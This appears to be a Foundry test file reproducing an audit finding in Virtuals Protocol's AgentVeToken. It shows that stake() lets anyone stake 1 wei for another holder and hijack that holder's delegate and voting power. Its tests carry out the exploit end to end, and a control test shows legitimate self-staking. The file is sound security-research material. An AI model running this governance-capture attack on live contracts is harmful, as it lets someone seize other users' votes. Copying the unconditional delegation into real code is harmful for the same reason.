// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./61823-h-02-anybody-can-control-a-users-delegate-by-calling-agentve.sol";

/*//////////////////////////////////////////////////////////////
    Virtuals Protocol — AgentVeToken.stake() delegate hijack (H-02, #61823)

    AgentVeToken.stake(amount, receiver, delegatee) calls
    `_delegate(receiver, delegatee)` UNCONDITIONALLY. Anyone can stake 1 wei of
    the LP asset token FOR a high-balance receiver and set an arbitrary
    delegatee, overwriting that receiver's chosen delegate and redirecting all of
    their veToken voting power to the attacker — a governance-capture primitive.

    - test_exploit: drives the cheatcode-free Exploit end to end, then re-asserts
      the hijack from the driver's perspective.
    - test_anyoneCanHijackDelegate: standalone rebuild mirroring the finding's
      PoC (whale EOA self-stakes; attacker EOA hijacks with 1 wei).
    - test_selfStake_isLegitimate: control — the intended path (a holder staking
      and delegating for ITSELF) works as expected, contrasting the hijack.
//////////////////////////////////////////////////////////////*/
contract AgentVeTokenDelegateHijackTest is Test {
    /// @notice HARM via the self-contained Exploit: attacker hijacks the whale's
    ///         delegation and captures its full voting power with 1 wei of LP.
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        AgentVeToken ve = e.ve();
        address whale = e.whaleAddr();
        address attacker = e.attackerAddr();

        // Re-assert the HARM independently from the driver.
        assertEq(ve.delegates(whale), attacker, "whale delegate hijacked to attacker");
        assertGe(ve.getVotes(attacker), e.WHALE_STAKE(), "attacker captured the whale's voting power");
        assertEq(ve.getVotes(whale), 0, "whale's own voting power drained");
    }

    /// @notice Standalone rebuild with EOAs (mirrors the finding's foundry PoC:
    ///         a whale self-stakes; an attacker stakes 1 wei and takes the votes).
    function test_anyoneCanHijackDelegate() public {
        MockLPToken lp = new MockLPToken();
        MockAgentNft reg = new MockAgentNft();
        AgentVeToken ve = new AgentVeToken(address(lp), address(reg), true);

        address whale = makeAddr("whale");
        address attacker = makeAddr("attacker");

        lp.mint(whale, 1e18);
        lp.mint(attacker, 1);

        // Whale stakes honestly, delegating its voting power to itself.
        vm.startPrank(whale);
        lp.approve(address(ve), 1e18);
        ve.stake(1e18, whale, whale);
        vm.stopPrank();

        assertEq(ve.delegates(whale), whale, "whale self-delegated");
        assertEq(ve.getVotes(whale), 1e18, "whale controls its own votes");
        assertEq(ve.getVotes(attacker), 0, "attacker has no votes yet");

        // Attacker stakes 1 wei FOR the whale, naming ITSELF the delegatee.
        vm.startPrank(attacker);
        lp.approve(address(ve), 1);
        ve.stake(1, whale, attacker);
        vm.stopPrank();

        // HARM: the whale's delegation is overwritten; the attacker now holds
        // the whale's entire voting power (1e18 + the 1 wei just staked).
        assertEq(ve.delegates(whale), attacker, "whale delegation hijacked");
        assertEq(ve.getVotes(attacker), 1e18 + 1, "attacker captured whale votes");
        assertEq(ve.getVotes(whale), 0, "whale voting power drained");
    }

    /// @notice Control: the INTENDED usage (holder stakes and delegates for
    ///         itself) behaves correctly. This is the path the recommended fix
    ///         (`if (sender == receiver) _delegate(...)`) would still allow.
    function test_selfStake_isLegitimate() public {
        MockLPToken lp = new MockLPToken();
        MockAgentNft reg = new MockAgentNft();
        AgentVeToken ve = new AgentVeToken(address(lp), address(reg), true);

        address holder = makeAddr("holder");
        address chosenDelegate = makeAddr("chosenDelegate");

        lp.mint(holder, 1e18);
        vm.startPrank(holder);
        lp.approve(address(ve), 1e18);
        // Holder itself picks its delegate — legitimate self-service.
        ve.stake(1e18, holder, chosenDelegate);
        vm.stopPrank();

        assertEq(ve.delegates(holder), chosenDelegate, "holder set its own delegate");
        assertEq(ve.getVotes(chosenDelegate), 1e18, "votes go where the holder chose");
    }
}
